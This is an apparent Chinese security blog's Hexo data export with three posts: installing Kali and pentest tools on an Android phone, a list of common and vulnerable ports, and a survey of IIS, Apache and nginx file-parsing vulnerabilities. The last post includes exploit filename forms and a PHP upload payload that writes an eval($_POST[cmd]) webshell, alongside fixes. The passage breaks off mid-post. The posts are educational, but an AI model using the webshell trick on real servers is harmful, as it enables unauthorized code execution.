起初看到网上的一些教程，介绍root手机非常简单，下载第三方软件，便可一键root。于是抱着轻松地态度在电脑上下载了一款软件（root精灵），接着将手机连上电脑，便开始点击一键root了。过了几分钟提示root成功，心想，原来破解手机这么简单，刚想吐槽小米，打开手机便发现根本没有root成功，NM坑爹。然后卸载了此软件，又重新找了一款（root大师），结果同样如此。\n　　心中默默骂了几条街后，喝口水冷静了会，重新上网搜索资料，竟然无意看到了小米官方提供开发者版本的安装包（晕倒，所以不能盲目使用第三方软件，一般厂商会给出相应的软件或者安装包）。\n　　官方下载地址：[http://www.miui.com/download-241.html](http://www.miui.com/download-241.html)\n　　根据官方提供的教程安装即可（我选择了第二种安装方式），安装完以后在安全中心授予应用程序root权限，其他品牌的手机请自行百度，方法大同小异。\n\n### 安装linux-deploy\n　　Linux deploy是一个可以快速在Android设备上安装运行Linux操作系统的App,遵循GPLv3协议，运行需要root权限。linux-deploy软件介绍：[http://www.cnblogs.com/mzlw/p/4841707.html](http://www.cnblogs.com/mzlw/p/4841707.html)\n在手机上安装完linux-deploy，运行后进行配置：\n![](/upload_image/20170210/3.png)\n运行界面如上图所示，点击右下角进行配置：\n![](/upload_image/20170210/1.png)\n发行版选择：kali-linux；源地址选择国内镜像：http://202.141.160.110/kali/\n![](/upload_image/20170210/2.png)\n勾选上ssh,vnc，在启动系统后会自动开启ssh以及vnc服务，方便远程管理。\n配置完成后点击安装，等待一会。\n![](/upload_image/20170210/4.png)\n安装完以后点击启动，如若成功，便可以用ssh工具连接此系统。\n![](/upload_image/20170210/6.png)\n\n注：linux-deploy只是一款软件，安装它对应手机本身不会造成什么影响（除了占用存储空间），也不会清空数据（不是刷机）\n\nlinux-deploy安装kali参考：\n[http://www.freebuf.com/articles/terminal/13209.html](http://www.freebuf.com/articles/terminal/13209.html)\n[http://www.freebuf.com/articles/terminal/47817.html](http://www.freebuf.com/articles/terminal/47817.html)\n\n### kali上安装渗透工具\n　　虽然手机上安装kali成功了，但是此kali系统上并没有任何工具，需要自己安装。因为kali官方的源太慢了，因此建议更换国内的源。手机上安装一个ssh远程连接工具，连接上kali系统，并输入以下命令：\n```bash\nvim /etc/apt/sources.list\n```\n清空文件内容并添加以下内容：\n```bash\ndeb http://202.141.160.110/kali/ kali-rolling main contrib non-free\ndeb-src http://202.141.160.110/kali kali-rolling main contrib non-free\n```\n更换完以后，更新源：\n```bash\nsudo su       #切换到root用户\napt-get update\napt-get upgrade\n```\n安装工具：\n```bash\napt-get install nmap\napt-get install sqlmap\napt-get install metasploit-framework\n......\n```\n运行截图：\n![](/upload_image/20170210/5.png)\n*运行速度还行，方便携带，居家旅行必备神器！*\n\n### 其他安全工具\n　　除了在安卓手机上安装kali系统以外，很多安全软件也支持安卓系统，比如dsploit、busybox、nmap for android等。首先在手机上安装busybox软件（授予root权限），运行软件以后勾选上智能安装选项，然后点击安装busybox。安装完busybox后，才可以使用dsploit等软件，当然这些软件也都是需要root权限的。至于这些安全软件的用法，网上一搜一大推，这里便不再介绍了。\n\n### 软件工具下载\n链接: [https://pan.baidu.com/s/1miqcGjQ](https://pan.baidu.com/s/1miqcGjQ)  密码: ch5f\n\n\n<center>*有时候折腾仅仅只是为了折腾，仅此而已！*</center>","slug":"安卓版Kali-linux","published":1,"updated":"2017-02-14T01:12:03.338Z","layout":"post","photos":[],"link":"","_id":"ciz80dybo001c3ofv55e662hf","content":"<p>　　据说OPPO拍照神器最近很火，于是便凑热闹买了一款（R9s），外形不错，性能说得过去。尤其是自拍功能爱不释手（……），于是手头原本的小米便闲置了出来。作为一名崇尚节俭持家的技术男，当然是要废物利用一番，于是便有了以下的一番折腾。<br>　　我的目的是打造一款渗透测试专用手机，最先想到的方案是在手机上安装kali-linx系统，因为该系统集成了很多渗透测试工具，解决了很多依赖问题，省去不少麻烦。那么问题来了，怎么在手机上安装kali-linux系统呢？在查找了一些资料之后，我理了理思路：<br>（1）手机需要root<br>（2）手机上安装linux-deploy<br>（3）在linux-deploy上安装kali<br>（4）在kali里面安装渗透测试工具<br>思路有了，那么让我们撸起袖子干起来吧！(以下提到的安装包会在文章最后提供下载！)</p>\n<h3 id=\"Root\"><a href=\"#Root\" class=\"headerlink\" title=\"Root\"></a>Root</h3><p>　　起初看到网上的一些教程，介绍root手机非常简单，下载第三方软件，便可一键root。于是抱着轻松地态度在电脑上下载了一款软件（root精灵），接着将手机连上电脑，便开始点击一键root了。过了几分钟提示root成功，心想，原来破解手机这么简单，刚想吐槽小米，打开手机便发现根本没有root成功，NM坑爹。然后卸载了此软件，又重新找了一款（root大师），结果同样如此。<br>　　心中默默骂了几条街后，喝口水冷静了会，重新上网搜索资料，竟然无意看到了小米官方提供开发者版本的安装包（晕倒，所以不能盲目使用第三方软件，一般厂商会给出相应的软件或者安装包）。<br>　　官方下载地址：<a href=\"http://www.miui.com/download-241.html\" target=\"_blank\" rel=\"external\">http://www.miui.com/download-241.html</a><br>　　根据官方提供的教程安装即可（我选择了第二种安装方式），安装完以后在安全中心授予应用程序root权限，其他品牌的手机请自行百度，方法大同小异。</p>\n<h3 id=\"安装linux-deploy\"><a href=\"#安装linux-deploy\" class=\"headerlink\" title=\"安装linux-deploy\"></a>安装linux-deploy</h3><p>　　Linux deploy是一个可以快速在Android设备上安装运行Linux操作系统的App,遵循GPLv3协议，运行需要root权限。linux-deploy软件介绍：<a href=\"http://www.cnblogs.com/mzlw/p/4841707.html\" target=\"_blank\" rel=\"external\">http://www.cnblogs.com/mzlw/p/4841707.html</a><br>在手机上安装完linux-deploy，运行后进行配置：<br><img src=\"/upload_image/20170210/3.png\" alt=\"\"><br>运行界面如上图所示，点击右下角进行配置：<br><img src=\"/upload_image/20170210/1.png\" alt=\"\"><br>发行版选择：kali-linux；源地址选择国内镜像：<a href=\"http://202.141.160.110/kali/\" target=\"_blank\" rel=\"external\">http://202.141.160.110/kali/</a><br><img src=\"/upload_image/20170210/2.png\" alt=\"\"><br>勾选上ssh,vnc，在启动系统后会自动开启ssh以及vnc服务，方便远程管理。<br>配置完成后点击安装，等待一会。<br><img src=\"/upload_image/20170210/4.png\" alt=\"\"><br>安装完以后点击启动，如若成功，便可以用ssh工具连接此系统。<br><img src=\"/upload_image/20170210/6.png\" alt=\"\"></p>\n<p>注：linux-deploy只是一款软件，安装它对应手机本身不会造成什么影响（除了占用存储空间），也不会清空数据（不是刷机）</p>\n<p>linux-deploy安装kali参考：<br><a href=\"http://www.freebuf.com/articles/terminal/13209.html\" target=\"_blank\" rel=\"external\">http://www.freebuf.com/articles/terminal/13209.html</a><br><a href=\"http://www.freebuf.com/articles/terminal/47817.html\" target=\"_blank\" rel=\"external\">http://www.freebuf.com/articles/terminal/47817.html</a></p>\n<h3 id=\"kali上安装渗透工具\"><a href=\"#kali上安装渗透工具\" class=\"headerlink\" title=\"kali上安装渗透工具\"></a>kali上安装渗透工具</h3><p>　　虽然手机上安装kali成功了，但是此kali系统上并没有任何工具，需要自己安装。因为kali官方的源太慢了，因此建议更换国内的源。手机上安装一个ssh远程连接工具，连接上kali系统，并输入以下命令：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">vim /etc/apt/sources.list</div></pre></td></tr></table></figure></p>\n<p>清空文件内容并添加以下内容：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">deb http://202.141.160.110/kali/ kali-rolling main contrib non-free</div><div class=\"line\">deb-src http://202.141.160.110/kali kali-rolling main contrib non-free</div></pre></td></tr></table></figure></p>\n<p>更换完以后，更新源：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo su       <span class=\"comment\">#切换到root用户</span></div><div class=\"line\">apt-get update</div><div class=\"line\">apt-get upgrade</div></pre></td></tr></table></figure></p>\n<p>安装工具：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">apt-get install nmap</div><div class=\"line\">apt-get install sqlmap</div><div class=\"line\">apt-get install metasploit-framework</div><div class=\"line\">......</div></pre></td></tr></table></figure></p>\n<p>运行截图：<br><img src=\"/upload_image/20170210/5.png\" alt=\"\"><br><em>运行速度还行，方便携带，居家旅行必备神器！</em></p>\n<h3 id=\"其他安全工具\"><a href=\"#其他安全工具\" class=\"headerlink\" title=\"其他安全工具\"></a>其他安全工具</h3><p>　　除了在安卓手机上安装kali系统以外，很多安全软件也支持安卓系统，比如dsploit、busybox、nmap for android等。首先在手机上安装busybox软件（授予root权限），运行软件以后勾选上智能安装选项，然后点击安装busybox。安装完busybox后，才可以使用dsploit等软件，当然这些软件也都是需要root权限的。至于这些安全软件的用法，网上一搜一大推，这里便不再介绍了。</p>\n<h3 id=\"软件工具下载\"><a href=\"#软件工具下载\" class=\"headerlink\" title=\"软件工具下载\"></a>软件工具下载</h3><p>链接: <a href=\"https://pan.baidu.com/s/1miqcGjQ\" target=\"_blank\" rel=\"external\">https://pan.baidu.com/s/1miqcGjQ</a>  密码: ch5f</p>\n<center><em>有时候折腾仅仅只是为了折腾，仅此而已！</em></center>","excerpt":"","more":"<p>　　据说OPPO拍照神器最近很火，于是便凑热闹买了一款（R9s），外形不错，性能说得过去。尤其是自拍功能爱不释手（……），于是手头原本的小米便闲置了出来。作为一名崇尚节俭持家的技术男，当然是要废物利用一番，于是便有了以下的一番折腾。<br>　　我的目的是打造一款渗透测试专用手机，最先想到的方案是在手机上安装kali-linx系统，因为该系统集成了很多渗透测试工具，解决了很多依赖问题，省去不少麻烦。那么问题来了，怎么在手机上安装kali-linux系统呢？在查找了一些资料之后，我理了理思路：<br>（1）手机需要root<br>（2）手机上安装linux-deploy<br>（3）在linux-deploy上安装kali<br>（4）在kali里面安装渗透测试工具<br>思路有了，那么让我们撸起袖子干起来吧！(以下提到的安装包会在文章最后提供下载！)</p>\n<h3 id=\"Root\"><a href=\"#Root\" class=\"headerlink\" title=\"Root\"></a>Root</h3><p>　　起初看到网上的一些教程，介绍root手机非常简单，下载第三方软件，便可一键root。于是抱着轻松地态度在电脑上下载了一款软件（root精灵），接着将手机连上电脑，便开始点击一键root了。过了几分钟提示root成功，心想，原来破解手机这么简单，刚想吐槽小米，打开手机便发现根本没有root成功，NM坑爹。然后卸载了此软件，又重新找了一款（root大师），结果同样如此。<br>　　心中默默骂了几条街后，喝口水冷静了会，重新上网搜索资料，竟然无意看到了小米官方提供开发者版本的安装包（晕倒，所以不能盲目使用第三方软件，一般厂商会给出相应的软件或者安装包）。<br>　　官方下载地址：<a href=\"http://www.miui.com/download-241.html\">http://www.miui.com/download-241.html</a><br>　　根据官方提供的教程安装即可（我选择了第二种安装方式），安装完以后在安全中心授予应用程序root权限，其他品牌的手机请自行百度，方法大同小异。</p>\n<h3 id=\"安装linux-deploy\"><a href=\"#安装linux-deploy\" class=\"headerlink\" title=\"安装linux-deploy\"></a>安装linux-deploy</h3><p>　　Linux deploy是一个可以快速在Android设备上安装运行Linux操作系统的App,遵循GPLv3协议，运行需要root权限。linux-deploy软件介绍：<a href=\"http://www.cnblogs.com/mzlw/p/4841707.html\">http://www.cnblogs.com/mzlw/p/4841707.html</a><br>在手机上安装完linux-deploy，运行后进行配置：<br><img src=\"/upload_image/20170210/3.png\" alt=\"\"><br>运行界面如上图所示，点击右下角进行配置：<br><img src=\"/upload_image/20170210/1.png\" alt=\"\"><br>发行版选择：kali-linux；源地址选择国内镜像：<a href=\"http://202.141.160.110/kali/\">http://202.141.160.110/kali/</a><br><img src=\"/upload_image/20170210/2.png\" alt=\"\"><br>勾选上ssh,vnc，在启动系统后会自动开启ssh以及vnc服务，方便远程管理。<br>配置完成后点击安装，等待一会。<br><img src=\"/upload_image/20170210/4.png\" alt=\"\"><br>安装完以后点击启动，如若成功，便可以用ssh工具连接此系统。<br><img src=\"/upload_image/20170210/6.png\" alt=\"\"></p>\n<p>注：linux-deploy只是一款软件，安装它对应手机本身不会造成什么影响（除了占用存储空间），也不会清空数据（不是刷机）</p>\n<p>linux-deploy安装kali参考：<br><a href=\"http://www.freebuf.com/articles/terminal/13209.html\">http://www.freebuf.com/articles/terminal/13209.html</a><br><a href=\"http://www.freebuf.com/articles/terminal/47817.html\">http://www.freebuf.com/articles/terminal/47817.html</a></p>\n<h3 id=\"kali上安装渗透工具\"><a href=\"#kali上安装渗透工具\" class=\"headerlink\" title=\"kali上安装渗透工具\"></a>kali上安装渗透工具</h3><p>　　虽然手机上安装kali成功了，但是此kali系统上并没有任何工具，需要自己安装。因为kali官方的源太慢了，因此建议更换国内的源。手机上安装一个ssh远程连接工具，连接上kali系统，并输入以下命令：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">vim /etc/apt/sources.list</div></pre></td></tr></table></figure></p>\n<p>清空文件内容并添加以下内容：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">deb http://202.141.160.110/kali/ kali-rolling main contrib non-free</div><div class=\"line\">deb-src http://202.141.160.110/kali kali-rolling main contrib non-free</div></pre></td></tr></table></figure></p>\n<p>更换完以后，更新源：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo su       <span class=\"comment\">#切换到root用户</span></div><div class=\"line\">apt-get update</div><div class=\"line\">apt-get upgrade</div></pre></td></tr></table></figure></p>\n<p>安装工具：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">apt-get install nmap</div><div class=\"line\">apt-get install sqlmap</div><div class=\"line\">apt-get install metasploit-framework</div><div class=\"line\">......</div></pre></td></tr></table></figure></p>\n<p>运行截图：<br><img src=\"/upload_image/20170210/5.png\" alt=\"\"><br><em>运行速度还行，方便携带，居家旅行必备神器！</em></p>\n<h3 id=\"其他安全工具\"><a href=\"#其他安全工具\" class=\"headerlink\" title=\"其他安全工具\"></a>其他安全工具</h3><p>　　除了在安卓手机上安装kali系统以外，很多安全软件也支持安卓系统，比如dsploit、busybox、nmap for android等。首先在手机上安装busybox软件（授予root权限），运行软件以后勾选上智能安装选项，然后点击安装busybox。安装完busybox后，才可以使用dsploit等软件，当然这些软件也都是需要root权限的。至于这些安全软件的用法，网上一搜一大推，这里便不再介绍了。</p>\n<h3 id=\"软件工具下载\"><a href=\"#软件工具下载\" class=\"headerlink\" title=\"软件工具下载\"></a>软件工具下载</h3><p>链接: <a href=\"https://pan.baidu.com/s/1miqcGjQ\">https://pan.baidu.com/s/1miqcGjQ</a>  密码: ch5f</p>\n<center><em>有时候折腾仅仅只是为了折腾，仅此而已！</em></center>"},{"title":"常用端口服务","date":"2017-01-24T01:25:46.000Z","comments":1,"_content":"\n范围：0-65535\n固定端口：0-1023   1024保留\n动态端口：1024-65535\n\n\n#### 常用端口\n21：FTP\n22：SSH\n23：Telnet\n25：SMTP\n53：DNS（UDP）\n69：TFTP（cisco，类似FTP）\n79：Finger\n80：HTTP\n110：POP3\n111：RPC 远程过程调用\n113：windows 验证服务\n119：NNTP 网络新闻组传输协议\n135：RPC 远程过程调用\n137：NetBIOS\n139：windows文件和打印机共享，Unix中的samba服务\n161：SNMP 简单网络管理协议\n389：LDAP\n443：HTTPS\n445：SMB\n1080：socks代理服务\n2601,2604：zebra路由，默认密码zebra\n5900：vnc\n8080：用户www代理服务\n\n#### 木马病毒\n5554：worm.Sasser病毒利用端口\n7626：冰河病毒\n8011：WAY2.4病毒\n7306：Netspy3.0病毒\n1024：YAI病毒\n\n\n#### 中间件\n7001,7002：weblogic\n9080：webshpere应用程序\n9090：webshpere管理工具\n8080：tomcat默认端口\nJboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093，默认为8080\n\n\n#### 数据库\n3306：mysql\n1433：sqlserver server\n1434：sqlserver monitor\n1521：oracle\n5432：PostgreSQL\n1158：ORACLE EMCTL\n8080：Oracle XDB\n2100：Oracle XDB FTP\n\n#### 特殊服务（漏洞）\n443：SSL心脏滴血\n512,513,514：Rsync未授权访问\n873：Rsync未授权访问\n2375：docker remote api漏洞\n5984：CouchDB\n6379：redis未授权\n7001,7002：WebLogic 默认弱口令，反序列化\n9200,9300：elasticsearch未授权访问\n11211：memcache未授权访问\n27017,27018：Mongodb 未授权访问\n28017：mongodb统计页面\n50000：SAP命令执行\n50070,50030：hadoop默认端口未授权访问\n\n\n\n*参考链接：[https://www.secpulse.com/archives/54880.html](https://www.secpulse.com/archives/54880.html)*","source":"_posts/常用端口服务.md","raw":"---\ntitle: 常用端口服务\ndate: 2017-01-24 09:25:46\ncomments: true\ntags: 系统服务\ncategories: 技术交流\n---\n\n范围：0-65535\n固定端口：0-1023   1024保留\n动态端口：1024-65535\n\n\n#### 常用端口\n21：FTP\n22：SSH\n23：Telnet\n25：SMTP\n53：DNS（UDP）\n69：TFTP（cisco，类似FTP）\n79：Finger\n80：HTTP\n110：POP3\n111：RPC 远程过程调用\n113：windows 验证服务\n119：NNTP 网络新闻组传输协议\n135：RPC 远程过程调用\n137：NetBIOS\n139：windows文件和打印机共享，Unix中的samba服务\n161：SNMP 简单网络管理协议\n389：LDAP\n443：HTTPS\n445：SMB\n1080：socks代理服务\n2601,2604：zebra路由，默认密码zebra\n5900：vnc\n8080：用户www代理服务\n\n#### 木马病毒\n5554：worm.Sasser病毒利用端口\n7626：冰河病毒\n8011：WAY2.4病毒\n7306：Netspy3.0病毒\n1024：YAI病毒\n\n\n#### 中间件\n7001,7002：weblogic\n9080：webshpere应用程序\n9090：webshpere管理工具\n8080：tomcat默认端口\nJboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093，默认为8080\n\n\n#### 数据库\n3306：mysql\n1433：sqlserver server\n1434：sqlserver monitor\n1521：oracle\n5432：PostgreSQL\n1158：ORACLE EMCTL\n8080：Oracle XDB\n2100：Oracle XDB FTP\n\n#### 特殊服务（漏洞）\n443：SSL心脏滴血\n512,513,514：Rsync未授权访问\n873：Rsync未授权访问\n2375：docker remote api漏洞\n5984：CouchDB\n6379：redis未授权\n7001,7002：WebLogic 默认弱口令，反序列化\n9200,9300：elasticsearch未授权访问\n11211：memcache未授权访问\n27017,27018：Mongodb 未授权访问\n28017：mongodb统计页面\n50000：SAP命令执行\n50070,50030：hadoop默认端口未授权访问\n\n\n\n*参考链接：[https://www.secpulse.com/archives/54880.html](https://www.secpulse.com/archives/54880.html)*","slug":"常用端口服务","published":1,"updated":"2017-02-14T01:12:03.338Z","layout":"post","photos":[],"link":"","_id":"ciz80dybr001g3ofvhdrpq6qe","content":"<p>范围：0-65535<br>固定端口：0-1023   1024保留<br>动态端口：1024-65535</p>\n<h4 id=\"常用端口\"><a href=\"#常用端口\" class=\"headerlink\" title=\"常用端口\"></a>常用端口</h4><p>21：FTP<br>22：SSH<br>23：Telnet<br>25：SMTP<br>53：DNS（UDP）<br>69：TFTP（cisco，类似FTP）<br>79：Finger<br>80：HTTP<br>110：POP3<br>111：RPC 远程过程调用<br>113：windows 验证服务<br>119：NNTP 网络新闻组传输协议<br>135：RPC 远程过程调用<br>137：NetBIOS<br>139：windows文件和打印机共享，Unix中的samba服务<br>161：SNMP 简单网络管理协议<br>389：LDAP<br>443：HTTPS<br>445：SMB<br>1080：socks代理服务<br>2601,2604：zebra路由，默认密码zebra<br>5900：vnc<br>8080：用户www代理服务</p>\n<h4 id=\"木马病毒\"><a href=\"#木马病毒\" class=\"headerlink\" title=\"木马病毒\"></a>木马病毒</h4><p>5554：worm.Sasser病毒利用端口<br>7626：冰河病毒<br>8011：WAY2.4病毒<br>7306：Netspy3.0病毒<br>1024：YAI病毒</p>\n<h4 id=\"中间件\"><a href=\"#中间件\" class=\"headerlink\" title=\"中间件\"></a>中间件</h4><p>7001,7002：weblogic<br>9080：webshpere应用程序<br>9090：webshpere管理工具<br>8080：tomcat默认端口<br>Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093，默认为8080</p>\n<h4 id=\"数据库\"><a href=\"#数据库\" class=\"headerlink\" title=\"数据库\"></a>数据库</h4><p>3306：mysql<br>1433：sqlserver server<br>1434：sqlserver monitor<br>1521：oracle<br>5432：PostgreSQL<br>1158：ORACLE EMCTL<br>8080：Oracle XDB<br>2100：Oracle XDB FTP</p>\n<h4 id=\"特殊服务（漏洞）\"><a href=\"#特殊服务（漏洞）\" class=\"headerlink\" title=\"特殊服务（漏洞）\"></a>特殊服务（漏洞）</h4><p>443：SSL心脏滴血<br>512,513,514：Rsync未授权访问<br>873：Rsync未授权访问<br>2375：docker remote api漏洞<br>5984：CouchDB<br>6379：redis未授权<br>7001,7002：WebLogic 默认弱口令，反序列化<br>9200,9300：elasticsearch未授权访问<br>11211：memcache未授权访问<br>27017,27018：Mongodb 未授权访问<br>28017：mongodb统计页面<br>50000：SAP命令执行<br>50070,50030：hadoop默认端口未授权访问</p>\n<p><em>参考链接：<a href=\"https://www.secpulse.com/archives/54880.html\" target=\"_blank\" rel=\"external\">https://www.secpulse.com/archives/54880.html</a></em></p>\n","excerpt":"","more":"<p>范围：0-65535<br>固定端口：0-1023   1024保留<br>动态端口：1024-65535</p>\n<h4 id=\"常用端口\"><a href=\"#常用端口\" class=\"headerlink\" title=\"常用端口\"></a>常用端口</h4><p>21：FTP<br>22：SSH<br>23：Telnet<br>25：SMTP<br>53：DNS（UDP）<br>69：TFTP（cisco，类似FTP）<br>79：Finger<br>80：HTTP<br>110：POP3<br>111：RPC 远程过程调用<br>113：windows 验证服务<br>119：NNTP 网络新闻组传输协议<br>135：RPC 远程过程调用<br>137：NetBIOS<br>139：windows文件和打印机共享，Unix中的samba服务<br>161：SNMP 简单网络管理协议<br>389：LDAP<br>443：HTTPS<br>445：SMB<br>1080：socks代理服务<br>2601,2604：zebra路由，默认密码zebra<br>5900：vnc<br>8080：用户www代理服务</p>\n<h4 id=\"木马病毒\"><a href=\"#木马病毒\" class=\"headerlink\" title=\"木马病毒\"></a>木马病毒</h4><p>5554：worm.Sasser病毒利用端口<br>7626：冰河病毒<br>8011：WAY2.4病毒<br>7306：Netspy3.0病毒<br>1024：YAI病毒</p>\n<h4 id=\"中间件\"><a href=\"#中间件\" class=\"headerlink\" title=\"中间件\"></a>中间件</h4><p>7001,7002：weblogic<br>9080：webshpere应用程序<br>9090：webshpere管理工具<br>8080：tomcat默认端口<br>Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093，默认为8080</p>\n<h4 id=\"数据库\"><a href=\"#数据库\" class=\"headerlink\" title=\"数据库\"></a>数据库</h4><p>3306：mysql<br>1433：sqlserver server<br>1434：sqlserver monitor<br>1521：oracle<br>5432：PostgreSQL<br>1158：ORACLE EMCTL<br>8080：Oracle XDB<br>2100：Oracle XDB FTP</p>\n<h4 id=\"特殊服务（漏洞）\"><a href=\"#特殊服务（漏洞）\" class=\"headerlink\" title=\"特殊服务（漏洞）\"></a>特殊服务（漏洞）</h4><p>443：SSL心脏滴血<br>512,513,514：Rsync未授权访问<br>873：Rsync未授权访问<br>2375：docker remote api漏洞<br>5984：CouchDB<br>6379：redis未授权<br>7001,7002：WebLogic 默认弱口令，反序列化<br>9200,9300：elasticsearch未授权访问<br>11211：memcache未授权访问<br>27017,27018：Mongodb 未授权访问<br>28017：mongodb统计页面<br>50000：SAP命令执行<br>50070,50030：hadoop默认端口未授权访问</p>\n<p><em>参考链接：<a href=\"https://www.secpulse.com/archives/54880.html\">https://www.secpulse.com/archives/54880.html</a></em></p>\n"},{"title":"服务器解析漏洞","date":"2016-09-21T08:07:00.000Z","comments":1,"_content":"　　服务器解析漏洞算是历史比较悠久了，但如今依然广泛存在。在此记录汇总一些常见服务器的解析漏洞，比如IIS6.0、IIS7.5、apache、nginx等方便以后回顾温习。\n<!--more-->\n#### （一）IIS5.x-6.x解析漏洞\n使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。\n##### 目录解析(6.0)\n形式：www.xxx.com/xx.asp/xx.jpg\n原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。\n##### 文件解析\n形式：www.xxx.com/xx.asp;.jpg\n原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。\n##### 解析文件类型\nIIS6.0 默认的可执行文件除了asp还包含这三种 :\n/test.asa\n/test.cer\n/test.cdx\n##### 修复方案\n1.目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。\n2.做好权限设置，限制用户创建文件夹。\n\n#### （二）apache解析漏洞\n##### 漏洞原理\n　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。\n##### 漏洞形式\nwww.xxxx.xxx.com/test.php.php123\n##### 其余配置问题导致漏洞\n（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。\n（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。\n##### 修复方案\n1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入\n```bash\n<Files ~ “.(php.|php3.)”>\n        Order Allow,Deny\n        Deny from all\n</Files>\n```\n2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so\n把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下:\n```bash\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteRule .(php.|php3.) /index.php\nRewriteRule .(pHp.|pHp3.) /index.php\nRewriteRule .(phP.|phP3.) /index.php\nRewriteRule .(Php.|Php3.) /index.php\nRewriteRule .(PHp.|PHp3.) /index.php\nRewriteRule .(PhP.|PhP3.) /index.php\nRewriteRule .(pHP.|pHP3.) /index.php\nRewriteRule .(PHP.|PHP3.) /index.php\n</IfModule>\n```\n\n#### （三）nginx解析漏洞\n##### 漏洞原理\n　　Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：\n\nPHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了\n##### 漏洞形式\nwww.xxxx.com/UploadFiles/image/1.jpg/1.php\nwww.xxxx.com/UploadFiles/image/1.jpg%00.php\nwww.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php\n\n另外一种手法：上传一个名字为test.jpg，以下内容的文件。\n```bash\n<?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>\n```\n然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。\n##### 修复方案\n1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;\n2.在Nginx配置文件中添加以下代码：\n```bash\n　　if ( $fastcgi_script_name ~ ..*/.*php ) {\n　　return 403;\n　　}\n```\n　　这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。\n\n#### （四）IIS7.5解析漏洞\n\nIIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。","source":"_posts/服务器解析漏洞.md","raw":"---\ntitle: 服务器解析漏洞\ndate: 2016-09-21 16:07:00\ncomments: true\ntags: Web应用漏洞\ncategories: 技术交流\n---\n　　服务器解析漏洞算是历史比较悠久了，但如今依然广泛存在。在此记录汇总一些常见服务器的解析漏洞，比如IIS6.0、IIS7.5、apache、nginx等方便以后回顾温习。\n<!--more-->\n#### （一）IIS5.x-6.x解析漏洞\n使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。\n##### 目录解析(6.0)\n形式：www.xxx.com/xx.asp/xx.jpg\n原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。\n##### 文件解析\n形式：www.xxx.com/xx.asp;.jpg\n原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。\n##### 解析文件类型\nIIS6.0 默认的可执行文件除了asp还包含这三种 :\n/test.asa\n/test.cer\n/test.cdx\n##### 修复方案\n1.目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。\n2.做好权限设置，限制用户创建文件夹。\n\n#### （二）apache解析漏洞\n##### 漏洞原理\n　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。\n##### 